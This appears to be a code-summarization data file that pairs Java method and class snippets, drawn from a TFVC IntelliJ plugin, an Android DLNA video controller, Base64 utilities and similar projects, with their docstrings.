1	public class Boolean_003 { public int BOOLEAN = 0; public int BOOLEAN_OBJECT = 1; public int OBJECT = 2; public int STRING = 4; public int LONG = 8; public int INT = 16; public int SHORT = 32; public int CHAR = 64; public int BYTE = 128; public int DOUBLE = 256; public int FLOAT = 512; public int ambiguous( float arg ) { return FLOAT; } public int ambiguous( double arg ) { return DOUBLE; } public int ambiguous( byte arg ) { return BYTE; } public int ambiguous( char arg ) { return CHAR; } public int ambiguous( short arg ) { return SHORT; } public int ambiguous( int arg ) { return INT; } public int ambiguous( long arg ) { return LONG; } public int ambiguous( String arg ) { return STRING; } public int ambiguous( Object arg ) { return OBJECT; } public int expect() { return OBJECT; } }	3.4 Preferred Argument Conversions 3.4.2 Boolean. Given a Java object that has several ambiguous methods, if JavaScript calls the ambiguous method with a boolean, the order of preference should be as follows, regardless of the order in which the methods are declared. boolean java.lang.Boolean java.lang.Object java.lang.String long, int, short, char, byte double, float
1	public class Boolean_004 { public int BOOLEAN = 0; public int BOOLEAN_OBJECT = 1; public int OBJECT = 2; public int STRING = 4; public int LONG = 8; public int INT = 16; public int SHORT = 32; public int CHAR = 64; public int BYTE = 128; public int DOUBLE = 256; public int FLOAT = 512; public int ambiguous( float arg ) { return FLOAT; } public int ambiguous( double arg ) { return DOUBLE; } public int ambiguous( byte arg ) { return BYTE; } public int ambiguous( char arg ) { return CHAR; } public int ambiguous( short arg ) { return SHORT; } public int ambiguous( int arg ) { return INT; } public int ambiguous( long arg ) { return LONG; } public int ambiguous( String arg ) { return STRING; } public int expect() { return STRING; } }	3.4 Preferred Argument Conversions 3.4.2 Boolean. Given a Java object that has several ambiguous methods, if JavaScript calls the ambiguous method with a boolean, the order of preference should be as follows, regardless of the order in which the methods are declared. boolean java.lang.Boolean java.lang.Object java.lang.String long, int, short, char, byte double, float
1	public class AbstractModel extends Observable { protected void setChangedAndNotify(final String propertyName) { super.setChanged(); super.notifyObservers(propertyName); } public void gotoLink(final String url) { if (StringUtils.isNotEmpty(url)) { BrowserUtil.browse(url); } } }	This class is a simple base class for all UI Models. It provides one additional method on to of Observable that combines setChanged and Notify.
1	public List?parseOutput(final String stdout, final String stderr) { super.throwIfError(stderr); final List?filesAdded = new ArrayList(); final String[] output = getLines(stdout); String path = StringUtils.EMPTY; for (final String line : output) { if (isFilePath(line)) { path = line; } else if (StringUtils.isNotEmpty(line)) { filesAdded.add(getFilePath(path, line, "")); } } return filesAdded; }	Returns the files that were added Output example: /Users/leantk/tfvc-tfs/tfsTest_01/.idea: misc.xml modules.xml /Users/leantk/tfvc-tfs/tfsTest_01: TestAdd.txt
1	public class AddCommand extends Command<list> { private final List?unversionedFiles; public AddCommand(final ServerContext context, final List?unversionedFiles) { super("add", context); ArgumentHelper.checkNotNullOrEmpty(unversionedFiles, "unversionedFiles"); this.unversionedFiles = unversionedFiles; } public ToolRunner.ArgumentBuilder getArgumentBuilder() { ToolRunner.ArgumentBuilder builder = super.getArgumentBuilder(); for (final String file : unversionedFiles) { builder.add(file); } return builder; } public List?parseOutput(final String stdout, final String stderr) { super.throwIfError(stderr); final List?filesAdded = new ArrayList(); final String[] output = getLines(stdout); String path = StringUtils.EMPTY; for (final String line : output) { if (isFilePath(line)) { path = line; } else if (StringUtils.isNotEmpty(line)) { filesAdded.add(getFilePath(path, line, "")); } } return filesAdded; } }</list	This command calls Add which adds an unversioned file into TFVC
1	protected File setupPreferenceDir(final String parentDirectory) { final File parent = new File(parentDirectory); final File vstsDirectory = new File(parent, VSTS_DIR); if (!vstsDirectory.exists()) { vstsDirectory.mkdir(); } return vstsDirectory; }	Create .vsts directory in user's home directory if not already there
1	protected String getIdeLocation() { final String resourcePath = Main.class.getResource(Main.class.getSimpleName() + CLASS_EXTENSION).getPath(); final Pattern pattern = Pattern.compile("file:(.*?)lib/bootstrap.jar!/" + Main.class.getName() + CLASS_EXTENSION); final Matcher matcher = pattern.matcher(resourcePath); if (matcher.find()) { return matcher.group(1); } return StringUtils.EMPTY; }	Find the current location of the IDE running
1	protected void doOsSetup(final File vstsDirectory, final String ideLocation) { if (Platform.isWindows()) { logger.debug("Windows operating system detected"); WindowsStartup.startup(); } else if (Platform.isMac()) { logger.debug("Mac operating system detected"); cacheIdeLocation(vstsDirectory, ideLocation + MAC_EXE_DIR); MacStartup.startup(); } else { logger.debug("Linux operating system detected "); cacheIdeLocation(vstsDirectory, ideLocation + LINUX_EXE_DIR); LinuxStartup.startup(); } }	Finds the OS type the plugin is running on and calls the setup for it
1	protected void configureAuthType() { if (AuthHelper.isAuthTypeFromSettingsFileSet()) { AuthHelper.setDeviceFlowEnvFromSettingsFile(); } else if (AuthHelper.isDeviceFlowEnvSetTrue()) { AuthHelper.setAuthTypeInSettingsFile(AuthTypes.DEVICE_FLOW); } }	Check if the auth type is set in the settings file or by the VM options
1	public List?build(final String toolLocation) { final List?commandLineParts = new ArrayList(arguments); commandLineParts.add(0, toolLocation); return Collections.unmodifiableList(commandLineParts); }	This method returns an unmodifiable list of arguments. The toolLocation passed in is inserted as the very first argument.
1	public String toString() { final StringBuilder builder = new StringBuilder(); for (int i = 0; i < arguments.size(); i++) { final String arg; if (secretArgumentIndexes.contains(i)) { arg = STARS; } else { arg = arguments.get(i); } builder.append(arg); builder.append(" "); } return builder.toString().trim(); }	Use this method to easily log all of the arguments. Secret arguments will be shown as *******
1	public ArtifactID(final String uri) { final String[] parts = decodeURI(uri); if (parts == null) { throw new MalformedURIException(String.format("The URI was not able to be decoded: %s", uri)); } tool = parts[0]; artifactType = parts[1]; toolSpecificId = parts[2]; }	Create a new artifact id from a TFS URI. The uri must be well-formed.
1	public String encodeURI() { if (!isWellFormed()) { throw new MalformedArtifactIDException(this); } final StringBuffer uri = new StringBuffer(); try { uri.append(VSTFS_PREFIX); uri.append(URLEncoder.encode(tool, URL_ENCODING)); uri.append(URI_SEPARATOR); uri.append(URLEncoder.encode(artifactType, URL_ENCODING)); uri.append(URI_SEPARATOR); uri.append(URLEncoder.encode(toolSpecificId, URL_ENCODING)); } catch (final UnsupportedEncodingException ex) { throw new RuntimeException(ex); } return uri.toString(); }	Encodes this artifact id as a TFS URI.
1	public boolean isWellFormed() { return isToolWellFormed(tool) && isArtifactTypeWellFormed(artifactType) && isToolSpecificIDWellFormed(toolSpecificId); }	Checks whether this artifact id is well formed.
1	private static String[] decodeURI(final String uri) { if (uri == null) { return null; } final String trimmedInput = uri.trim(); if (!trimmedInput.startsWith(VSTFS_PREFIX)) { return null; } final String inputWithoutPrefix = trimmedInput.substring(VSTFS_PREFIX.length()); final String[] parts = inputWithoutPrefix.split(URI_SEPARATOR); if (parts.length != 3) { return null; } String tool = null; String artifactType = null; String toolSpecificId = null; try { tool = URLDecoder.decode(parts[0], URL_ENCODING); artifactType = URLDecoder.decode(parts[1], URL_ENCODING); toolSpecificId = URLDecoder.decode(parts[2], URL_ENCODING); } catch (final UnsupportedEncodingException ex) { throw new RuntimeException(ex); } if (!isToolWellFormed(tool) || !isArtifactTypeWellFormed(artifactType) || !isToolSpecificIDWellFormed(toolSpecificId)) { return null; } return new String[]{ tool, artifactType, toolSpecificId }; }	IMPLEMENTATION DETAIL (keep private) Decodes a TFS URI, returning an array with the decoded parts. If the URI is well-formed, the returned array will have 3 elements. The elements (in order) will be tool, artifact type, and tool-specific id. If the URI is not well-formed, null will be returned.
1	public static void paintFocusRing(final Graphics g, final int x, final int y, final int width, final int height) { try { final Method paintFocusRingMethodNew = DarculaUIUtil.class.getDeclaredMethod("paintFocusRing", Graphics.class, Rectangle.class); paintFocusRingMethodNew.invoke(null, g, new Rectangle(x, y, width, height)); } catch (Exception newImplementationException) { try { logger.warn("Failed to get DarculaUIUtil.paintFocusRing() new implementation so attempting old way", newImplementationException); final Method paintFocusRingMethodOld = DarculaUIUtil.class.getDeclaredMethod("paintFocusRing", Graphics.class, Integer.TYPE, Integer.TYPE, Integer.TYPE, Integer.TYPE); paintFocusRingMethodOld.invoke(null, g, x, y, width, height); } catch (Exception oldImplementationException) { logger.warn("Failed to find DarculaUIUtil.paintFocusRing() method", oldImplementationException); } } }	Executing the DarculaUIUtil.paintFocusRing() method independent of the IDEA version we are on
1	public JComponent getPreferredFocusedComponent() { if (tabPanel != null) { final int i = getSelectedTabIndex(); final Component tab = tabPanel.getComponentAt(i); if (tab instanceof FocusableTabPage) { return ((FocusableTabPage) tab).getPreferredFocusedComponent(); } return tabPanel; } return super.getPreferredFocusedComponent(); }	This method returns the correct JComponent to set focus on from within the selected tab.
1	protected JComponent createCenterPanel() { tabPanel = new JTabbedPane(); tabPanel.setPreferredSize(new Dimension(JBUI.scale(500), JBUI.scale(600))); tabPanel.addChangeListener(new ChangeListener() { public void stateChanged(final ChangeEvent e) { doTabChangedAction(); } }); return tabPanel; }	There is a default implementation here, but subclasses can override this if they don't need tabbed pages.
1	public class BranchAlreadyExistsException extends ToolException { final String branchName; public BranchAlreadyExistsException(final String branchName) { super(ToolException.KEY_TF_BRANCH_EXISTS); this.branchName = branchName; } public String[] getMessageParameters() { return new String[]{branchName}; } }	Exception for when a branch is trying to be created but already exists
1	public void start(boolean show) { if (show) { setVisible(true); } timer.start(); }	Starts the spinning. The spinning is started by default. So, you may not need to call this method unless you call stop. Set show to true to automatically set visible to true
1	public void stop(boolean hide) { if (hide) { setVisible(false); } timer.stop(); }	Stops the spinning. This is a good thing to do if your spinner won't be shown all the time. You should stop it while it is not visible. Set hide to true to automatically set visible to false
1	private TFSContentRevision getPreviousRenamedRevision(final FilePath localPath, final int revision) { final ServerContext serverContext = TFSVcs.getInstance(project).getServerContext(false); final ChangeSet lastChangeSet = CommandUtils.getLastHistoryEntryForAnyUser(serverContext, localPath.getPath()); if (lastChangeSet != null && !lastChangeSet.getChanges().isEmpty()) { final String serverPath = lastChangeSet.getChanges().get(0).getServerItem(); final String originalPath = CommandUtils.getLocalPathSynchronously(serverContext, serverPath, CommandUtils.getWorkspaceName(project)); return TFSContentRevision.createRenameRevision(project, VersionControlPath.getFilePath(originalPath, localPath.isDirectory()), revision, lastChangeSet.getDate(), serverPath); } return null; }	Create the previous revision of a file that has been renamed
1	public class ChangeSet { private final String id; private final String owner; private final String committer; private final String date; private final String comment; private final List?changes; public ChangeSet(final String id, final String owner, final String committer, final String date, final String comment, final List?changes) { this.id = id; this.owner = owner; this.committer = committer; this.date = date; this.comment = comment; this.changes = new ArrayList(changes); } public String getId() { return id; } public int getIdAsInt() { return SystemHelper.toInt(id, 0); } public String getOwner() { return owner; } public String getCommitter() { return committer; } public String getDate() { return date; } public String getComment() { return comment; } public ListgetChanges() { return Collections.unmodifiableList(changes); } }	This class represents a TFVC changeset (returned by the History command).
1	public void testConstructor() { CheckoutModel cm = new CheckoutModel(null, null, new GitCheckoutModel()); Assert.assertTrue(cm.getTfsModel() != null); Assert.assertTrue(cm.getVsoModel() != null); }	This is just a really basic test of the constructor(s) It checks all the variants of the constructor(s) It checks the values of the properties right after construction
1	public void testObservable() { CheckoutModel cm = new CheckoutModel(null, null, new GitCheckoutModel()); MockObserver observer = new MockObserver(cm); cm.setVsoSelected(false); observer.assertAndClearLastUpdate(cm, CheckoutModel.PROP_VSO_SELECTED); Assert.assertEquals(false, cm.isVsoSelected()); cm.setVsoSelected(false); observer.assertAndClearLastUpdate(null, null); Assert.assertEquals(false, cm.isVsoSelected()); cm.setCloneEnabledForVso(true); observer.assertAndClearLastUpdate(cm, CheckoutModel.PROP_CLONE_ENABLED); cm.setCloneEnabledForVso(true); observer.assertAndClearLastUpdate(null, null); cm.setCloneEnabledForTfs(true); observer.assertAndClearLastUpdate(cm, CheckoutModel.PROP_CLONE_ENABLED); cm.setCloneEnabledForTfs(true); observer.assertAndClearLastUpdate(null, null); }	This test makes sure that all setters on the page model notify the observer if and only if the value changes.
1	public interface CheckoutPage extends FocusableTabPage { void addActionListener(ActionListener listener); void setLoginShowing(boolean showLogin); void setLoading(boolean loading); void setAuthenticating(boolean authenticating); void setAdvanced(boolean advanced); boolean getAdvanced(); void setRepositoryFilter(String filter); String getRepositoryFilter(); void setRepositoryTable(ServerContextTableModel tableModel, ListSelectionModel selectionModel); void setParentDirectory(String path); String getParentDirectory(); void setDirectoryName(String name); String getDirectoryName(); void setUserName(String name); void setServerName(String name); String getServerName(); JComponent getComponent(String name); }	This interface exists to make testing the controller possible
1	public void testActionPerformed() { MockCheckoutPageModel tfsModel = new MockCheckoutPageModel(null, ServerContextTableModel.VSO_GIT_REPO_COLUMNS); MockCheckoutPage tfsPage = new MockCheckoutPage(); CheckoutPageController tcc = new CheckoutPageController(null, tfsModel, tfsPage); tcc.actionPerformed(new ActionEvent(this, 1, LoginForm.CMD_SIGN_IN)); assertEquals(true, tfsModel.isLoadRepositoriesCalled()); tfsModel.clearInternals(); tcc.actionPerformed(new ActionEvent(this, 1, UserAccountPanel.CMD_SIGN_OUT)); assertEquals(false, tfsModel.isConnected()); tfsModel.clearInternals(); assertTrue(StringUtils.isEmpty(tfsModel.getRepositoryFilter())); tfsPage.setRepositoryFilter("filter"); tcc.actionPerformed(new ActionEvent(this, 1, CheckoutForm.CMD_REPO_FILTER_CHANGED)); assertEquals("filter", tfsModel.getRepositoryFilter()); tfsModel.clearInternals(); }	This test was added to cover the bit of the tfs controller that wasn't already covered
1	public void signOut() { super.signOut(); setConnected(false); setLoading(false); clearContexts(); }	Overriding SignOut to do a couple additional things.
1	public ServerContext getSelectedContext() { return repositoryTableModel.getSelectedContext(); }	This method is provided to allow the derived classes an easy way to get the selected repository instance.
1	public void clearContexts() { repositoryTableModel.clearRows(); }	This method is provided to allow the listener to update the list of contexts.
1	public void appendContexts(final List?serverContexts) { repositoryTableModel.addServerContexts(serverContexts); }	This method is provided to allow the listener to update the list of contexts.
1	protected void setParentModel(CheckoutModel parentModel) { this.parentModel = parentModel; }	This setter allows the tests to set the parent model.
1	public void testConstructor() { CheckoutPageModel pm1 = new MockCheckoutPageModel(null, ServerContextTableModel.VSO_GIT_REPO_COLUMNS); CheckoutPageModel pm2 = new MockCheckoutPageModel(new CheckoutModel(null, null, new GitCheckoutModel()), ServerContextTableModel.TFS_GIT_REPO_COLUMNS); CheckoutPageModel pm3 = new MockCheckoutPageModel(new CheckoutModel(null, null, new GitCheckoutModel()), new ServerContextTableModel.Column[0]); CheckoutPageModel pm = new MockCheckoutPageModel(new CheckoutModel(null, null, new GitCheckoutModel()), ServerContextTableModel.VSO_GIT_REPO_COLUMNS); Assert.assertEquals(CheckoutPageModel.DEFAULT_SOURCE_PATH, pm.getParentDirectory()); Assert.assertTrue(pm.getTableModel() != null); Assert.assertTrue(pm.getTableSelectionModel() != null); }	This is just a really basic test of the constructor(s) It checks all the variants of the constructor(s) It checks the values of the properties right after construction
1	public void testGotoLink() { CheckoutPageModel pm = new MockCheckoutPageModel(new CheckoutModel(null, null, new GitCheckoutModel()), ServerContextTableModel.VSO_GIT_REPO_COLUMNS); pm.gotoLink(null); pm.gotoLink(""); }	This is just a simple check to make sure that the gotoLink method handles null and empty string.
1	public void testServerName() { CheckoutPageModel pm = new MockCheckoutPageModel(new CheckoutModel(null, null, new GitCheckoutModel()), ServerContextTableModel.VSO_GIT_REPO_COLUMNS); Assert.assertEquals("", pm.getServerName()); String value = "http://newServerName/tfs"; pm.setServerName(value); Assert.assertEquals(value, pm.getServerName()); value = "newServerName"; pm.setServerName(value); Assert.assertEquals(String.format(CheckoutPageModel.DEFAULT_SERVER_FORMAT, value), pm.getServerName()); }	This tests the behavior of the ServerName setter and getter. By default the setter will actually change the value passed in if it is in a simplified form.
1	protected String getChangesetNumber(final String buffer) { String changesetNumber = StringUtils.EMPTY; final Matcher matcher = CHANGESET_NUMBER_PATTERN.matcher(buffer); if (matcher.find()) { changesetNumber = matcher.group(1); logger.info("Changeset '" + changesetNumber + "' was created"); } else { logger.info("Changeset pattern not found in buffer: " + buffer); } return changesetNumber; }	This method is used by Checkin and CreateBranch to parse out the changeset number.
1	protected boolean isOutputLineExpected(final String line, final String[] expectedPrefixes, final boolean filePathsAreExpected) { final String trimmed = line != null ? line.trim() : null; if (StringUtils.isNotEmpty(trimmed)) { if (filePathsAreExpected && isFilePath(line)) { return true; } if (expectedPrefixes != null) { for (final String prefix : expectedPrefixes) { if (StringUtils.startsWithIgnoreCase(line, prefix)) { return true; } } } return false; } return true; }	This method evaluates a line of output to see if it contains something that is expected. If not, it returns false. There are 3 kinds of expected lines: 1) lines that begin with an expected prefix 2) lines that contain a folder path (/path/path:) 3) empty lines All other types of lines are unexpected.
1	protected Workspace.Mapping getMapping(final String line) { final boolean isCloaked = StringUtils.startsWithIgnoreCase(line.trim(), "(cloaked)"); final int endIndex = line.indexOf(":"); final int startIndex = isCloaked ? line.indexOf(")") + 1 : 0; if (endIndex >= 0) { final String serverPath = line.substring(startIndex, endIndex).trim(); final String localPath = line.substring(endIndex + 1).trim(); return new Workspace.Mapping(serverPath, localPath, isCloaked); } return null; }	This method parses a single line of output returning the mapping if one was found Examples: "$/TFVC_11/folder1: D:\tmp\notdefault\folder1" "(cloaked) $/TFVC_11/folder1:"
1	protected boolean shouldThrowBadExitCode() { return true; }	If a bad exit code is detected then we should throw an exception. In some instances though we want to throw a more specific message or we want the IDE to handle the error differently so subclasses can override this
1	public static String getWorkspaceName(final Project project) { final Workspace workspace = getPartialWorkspace(project); if (workspace != null) { return workspace.getName(); } return StringUtils.EMPTY; }	This method will return just the workspace name or empty string (never null)
1	public static Workspace getPartialWorkspace(final Project project) { ArgumentHelper.checkNotNull(project, "project"); final FindWorkspaceCommand command = new FindWorkspaceCommand(project.getBasePath()); return command.runSynchronously(); }	This method will return a partially populated Workspace object that includes just the name, server, and mappings
1	public static Workspace getPartialWorkspace(final String collectionName, final String workspaceName) { return getPartialWorkspace(collectionName, workspaceName, null); }	This method will return a partially populated Workspace object that includes just the name, server, and mappings
1	public static Workspace getDetailedWorkspace(final String collectionName, final String workspaceName, final AuthenticationInfo authInfo) { ArgumentHelper.checkNotNull(workspaceName, "workspaceName"); ArgumentHelper.checkNotNull(authInfo, "authInfo"); final GetDetailedWorkspaceCommand command = new GetDetailedWorkspaceCommand(collectionName, workspaceName, authInfo); return command.runSynchronously(); }	This method will return the detailed results of a workspace The collection is needed for sever workspaces but not local
1	public static Workspace getWorkspace(final ServerContext context, final Project project) { final String workspaceName = getWorkspaceName(project); return getWorkspace(context, workspaceName); }	This method determines the workspace name from the project and then calls getWorkspace with the name.
1	public static Workspace getWorkspace(final ServerContext context, final String workspaceName) { final GetWorkspaceCommand command = new GetWorkspaceCommand(context, workspaceName); return command.runSynchronously(); }	This method returns the fully filled out Workspace object.
1	public static List?getAllWorkspaces(final ServerContext context) { final GetAllWorkspacesCommand command = new GetAllWorkspacesCommand(context); return command.runSynchronously(); }	This method returns a list of server that have workspaces locally
1	public static void refreshWorkspacesForServer(final AuthenticationInfo authInfo, final String serverUrl) { final GetAllWorkspacesCommand command = new GetAllWorkspacesCommand(authInfo, serverUrl); command.runSynchronously(); }	This method refreshes the cache for a server to pull in any remote changes
1	public static void deleteWorkspace(final ServerContext context, final String workspaceName) { final DeleteWorkspaceCommand command = new DeleteWorkspaceCommand(context, workspaceName); command.runSynchronously(); }	This method deletes a given workspace
1	public static String addWorkspaceMapping(final ServerContext serverContext, final String workspaceName, final String serverPath, final String localPath) { final UpdateWorkspaceMappingCommand updateMappingCommand = new UpdateWorkspaceMappingCommand( serverContext, workspaceName, new Workspace.Mapping(serverPath, localPath, false), false); return updateMappingCommand.runSynchronously(); }	Adds a workspace mapping to the workspace named
1	public static String updateWorkspace(final ServerContext context, final Workspace oldWorkspace, final Workspace newWorkspace) { if (WorkspaceHelper.areMappingsDifferent(oldWorkspace, newWorkspace)) { for (final Workspace.Mapping m : WorkspaceHelper.getMappingsToRemove(oldWorkspace, newWorkspace)) { final UpdateWorkspaceMappingCommand command = new UpdateWorkspaceMappingCommand(context, oldWorkspace.getName(), m, true); command.runSynchronously(); } for (final Workspace.Mapping m : WorkspaceHelper.getMappingsToChange(oldWorkspace, newWorkspace)) { final UpdateWorkspaceMappingCommand command = new UpdateWorkspaceMappingCommand(context, oldWorkspace.getName(), m, false); command.runSynchronously(); } } final UpdateWorkspaceCommand updateWorkspaceCommand = new UpdateWorkspaceCommand(context, oldWorkspace.getName(), newWorkspace.getName(), newWorkspace.getComment(), null, null); return updateWorkspaceCommand.runSynchronously(); }	This command updates the properies of the workspace as well as the mappings. There are many commands that go into the update, not just a single call. If anything goes wrong, an exception will be thrown. Note: this method does NOT sync the workspace.
1	public static SyncResults syncWorkspace(final ServerContext context, final String rootPath) { return syncWorkspace(context, Collections.singletonList(rootPath), true, true); }	This method Syncs the workspace based on the root path recursively. This is a synchronous call so it should only be called on a background thread.
1	public static void forceGetFile(final ServerContext context, final String filePath) { final SyncCommand command = new SyncCommand(context, Collections.singletonList(filePath), false, false, true); command.runSynchronously(); }	This method forces the Get of a file from the server
1	public static List?undoLocalFiles(final ServerContext context, final List?files) { final UndoCommand command = new UndoCommand(context, files); return command.runSynchronously(); }	This method undoes the list of local files passed in. This is a synchronous call so it should only be called on a background thread.
1	public class CustomURLSpan extends ClickableSpan { private final String mURL; public CustomURLSpan(String url) { mURL = url; } public String getURL() { return mURL; } public void onClick(View widget) { UiUtils.openUrl(widget.getContext(), getURL()); } }	Custom ClickableSpan that launches the WebView activity instead of the Android browser
1	public void setLevel(Level level) { this.level = level; }	Change the level at which this interceptor logs.
1	public class PlaceAutocomplete { public CharSequence placeId; public CharSequence description; PlaceAutocomplete(CharSequence placeId, CharSequence description) { this.placeId = placeId; this.description = description; } public String toString() { return description.toString(); } }	Holder for Places Geo Data Autocomplete API results.
1	public void setBounds(LatLngBounds bounds) { mBounds = bounds; }	Sets the bounds for all subsequent queries.
1	public Filter getFilter() { Filter filter = new Filter() { @Override protected FilterResults performFiltering(CharSequence constraint) { FilterResults results = new FilterResults(); if (constraint != null) { mResultList = getAutocomplete(constraint); if (mResultList != null) { results.values = mResultList; results.count = mResultList.size(); } } return results; } protected void publishResults(CharSequence constraint, FilterResults results) { if (results != null && results.count > 0) { notifyDataSetChanged(); } else { } } }; return filter; }	Returns the filter for the current set of autocomplete results.
1	private void startThread() { if (mSearchThread != null) { LogUtil.d(TAG, "thread is not null"); mSearchThread.setSearchTimes(0); } else { LogUtil.d(TAG, "thread is null, create a new thread"); mSearchThread = new SearchThread(mControlPoint); } if (mSearchThread.isAlive()) { LogUtil.d(TAG, "thread is alive"); mSearchThread.awake(); } else { LogUtil.d(TAG, "start the thread"); mSearchThread.start(); } }	Make the thread start to search devices.
1	public class LogUtil { private static final int LOG_LEVEL = 6; private static final int VERBOSE = 5; private static final int DEBUG = 4; private static final int INFO = 3; private static final int WARN = 2; private static final int ERROR = 1; public static void v(String tag, String msg) { if (LOG_LEVEL > VERBOSE) { Log.v(tag, msg); } } public static void d(String tag, String msg) { if (LOG_LEVEL > DEBUG) { Log.d(tag, msg); } } public static void i(String tag, String msg) { if (LOG_LEVEL > INFO) { Log.i(tag, msg); } } public static void w(String tag, String msg) { if (LOG_LEVEL > WARN) { Log.w(tag, msg); } } public static void e(String tag, String msg) { if (LOG_LEVEL > ERROR) { Log.e(tag, msg); } } }	Log utilities that can control whether print the log.
1	public boolean play(Device device, String path) { Service service = device.getService(AVTransport1); if (service == null) { return false; } final Action action = service.getAction(SetAVTransportURI); if (action == null) { return false; } final Action playAction = service.getAction(Play); if (playAction == null) { return false; } if (TextUtils.isEmpty(path)) { return false; } action.setArgumentValue("InstanceID", 0); action.setArgumentValue("CurrentURI", path); action.setArgumentValue("CurrentURIMetaData", 0); if (!action.postControlAction()) { return false; } playAction.setArgumentValue("InstanceID", 0); playAction.setArgumentValue("Speed", "1"); return playAction.postControlAction(); }	Play the video with the video path.
1	public int getMinVolumeValue(Device device) { String minValue = getVolumeDbRange(device, "MinValue"); if (TextUtils.isEmpty(minValue)) { return 0; } return Integer.parseInt(minValue); }	Get the min volume value,this must be 0.
1	public int getMaxVolumeValue(Device device) { String maxValue = getVolumeDbRange(device, "MaxValue"); if (TextUtils.isEmpty(maxValue)) { return 100; } return Integer.parseInt(maxValue); }	Get the max volume value, usually it is 100.
1	public String getPositionInfo(Device device) { Service localService = device.getService(AVTransport1); if (localService == null) return null; final Action localAction = localService.getAction("GetPositionInfo"); if (localAction == null) { return null; } localAction.setArgumentValue("InstanceID", "0"); boolean isSuccess = localAction.postControlAction(); if (isSuccess) { return localAction.getArgumentValue("AbsTime"); } else { return null; } }	Get the current playing position of the video.
1	public String getMediaDuration(Device device) { Service localService = device.getService(AVTransport1); if (localService == null) { return null; } final Action localAction = localService.getAction("GetMediaInfo"); if (localAction == null) { return null; } localAction.setArgumentValue("InstanceID", "0"); if (localAction.postControlAction()) { return localAction.getArgumentValue("MediaDuration"); } else { return null; } }	Get the duration of the video playing.
1	public boolean setMute(Device mediaRenderDevice, String targetValue) { Service service = mediaRenderDevice.getService(RenderingControl); if (service == null) { return false; } final Action action = service.getAction("SetMute"); if (action == null) { return false; } action.setArgumentValue("InstanceID", "0"); action.setArgumentValue("Channel", "Master"); action.setArgumentValue("DesiredMute", targetValue); return action.postControlAction(); }	Mute the device or not.
1	public String getMute(Device device) { Service service = device.getService(RenderingControl); if (service == null) { return null; } final Action getAction = service.getAction("GetMute"); if (getAction == null) { return null; } getAction.setArgumentValue("InstanceID", "0"); getAction.setArgumentValue("Channel", "Master"); getAction.postControlAction(); return getAction.getArgumentValue("CurrentMute"); }	Get if the device is mute.
1	public int getVoice(Device device) { Service service = device.getService(RenderingControl); if (service == null) { return -1; } final Action getAction = service.getAction("GetVolume"); if (getAction == null) { return -1; } getAction.setArgumentValue("InstanceID", "0"); getAction.setArgumentValue("Channel", "Master"); if (getAction.postControlAction()) { return getAction.getArgumentIntegerValue("CurrentVolume"); } else { return -1; } }	Get the current voice of the device.
1	public synchronized void setSearchTimes(int searchTimes) { this.mSearchTimes = searchTimes; }	Set the search times, set this to 0 to make it search fast.
1	public void stopThread() { flag = false; awake(); }	Stop the thread, if quit this application we should use this method to stop the thread.
1	private void startPlayVideo(int seekTime) { if (null == mUpdateTimer) resetUpdateTimer(); resetHideTimer(); mSuperVideoView.setOnCompletionListener(mOnCompletionListener); mSuperVideoView.start(); if (seekTime > 0) { mSuperVideoView.seekTo(seekTime); } mMediaController.setPlayState(MediaController.PlayState.PLAY); }	should called after setVideoPath()
1	private synchronized void playVideoOnTv(final String path) { new Thread() { public void run() { final boolean isSuccess = mController.play(mSelectDevice, path); Message message = new Message(); message.what = MSG_PLAY_ON_TV_RESULT; message.arg1 = isSuccess ? 1 : 0; mHandler.sendMessage(message); } }.start(); }	Start to play the video.
1	public void encrypt(byte[] data) throws IOException { if (data != null) { encrypt(data, data.length); } }	Encrypts the array. The whole array will be encrypted.
1	public void decrypt(byte[] data) throws IOException { if (data != null) { decrypt(data, data.length); } }	Decrypts the array. The whole array will be decrypted.
1	public ByteBuffer decode(ByteBuffer buffer) { int pos0 = buffer.position(); try { byte[] src; int sp, sl; if (buffer.hasArray()) { src = buffer.array(); sp = buffer.arrayOffset() + buffer.position(); sl = buffer.arrayOffset() + buffer.limit(); buffer.position(buffer.limit()); } else { src = new byte[buffer.remaining()]; buffer.get(src); sp = 0; sl = src.length; } byte[] dst = new byte[outLength(src, sp, sl)]; return ByteBuffer.wrap(dst, 0, decode0(src, sp, sl, dst)); } catch (IllegalArgumentException iae) { buffer.position(pos0); throw iae; } }	Upon return, the source buffer's position will be updated to its limit; its limit will not have been changed. The returned output buffer's position will be zero and its limit will be the number of resulting decoded bytes
1	public InputStream wrap(InputStream is) { if (is == null) { throw new NullPointerException(); } return new DecInputStream(is, isURL ? fromBase64URL : fromBase64, isMIME); }	Closing the returned input stream will close the underlying input stream.
1	public ByteBuffer encode(ByteBuffer buffer) { int len = outLength(buffer.remaining()); byte[] dst = new byte[len]; int ret = 0; if (buffer.hasArray()) { ret = encode0(buffer.array(), buffer.arrayOffset() + buffer.position(), buffer.arrayOffset() + buffer.limit(), dst); buffer.position(buffer.limit()); } else { byte[] src = new byte[buffer.remaining()]; buffer.get(src); ret = encode0(src, 0, src.length, dst); } if (ret != dst.length) { dst = Arrays.copyOf(dst, ret); } return ByteBuffer.wrap(dst); }	Upon return, the source buffer's position will be updated to its limit; its limit will not have been changed. The returned output buffer's position will be zero and its limit will be the number of resulting encoded bytes.
1	public OutputStream wrap(OutputStream os) { if (os == null) { throw new NullPointerException(); } return new EncOutputStream(os, isURL ? toBase64URL : toBase64, newline, linemax, doPadding); }	It is recommended to promptly close the returned output stream after use, during which it will flush all possible leftover bytes to the underlying output stream. Closing the returned output stream will close the underlying output stream.
1	public Encoder withoutPadding() { if (!doPadding) { return this; } return new Encoder(isURL, newline, linemax, false); }	Returns an encoder instance that encodes equivalently to this one, but without adding any padding character at the end of the encoded byte data. The encoding scheme of this encoder instance is unaffected by this invocation. The returned encoder instance should be used for non-padding encoding operation.
1	Document(XComponent doc) { XModel xModel = (XModel) UnoRuntime.queryInterface( XModel.class, doc); int pos = -1; OfficeConnection conn = OfficeConnection.this; XFileIdentifierConverter nameConverter = conn.getFileNameConverterService(); this.doc = doc; this.url = xModel.getURL(); if ("".equals(this.url)) { XTitle xTitle = (XTitle) UnoRuntime.queryInterface( XTitle.class, doc); this.name = xTitle.getTitle(); return; } this.name = this.url.substring(this.url.lastIndexOf("/") + 1); pos = this.name.lastIndexOf("."); if (pos != -1) { this.name = this.name.substring(0, pos); } this.name = nameConverter.getSystemPathFromFileURL(this.name); return; }	Creates a new instance of an loaded document.
1	public String toString() { return this.name; }	Returns a string representation of the document.
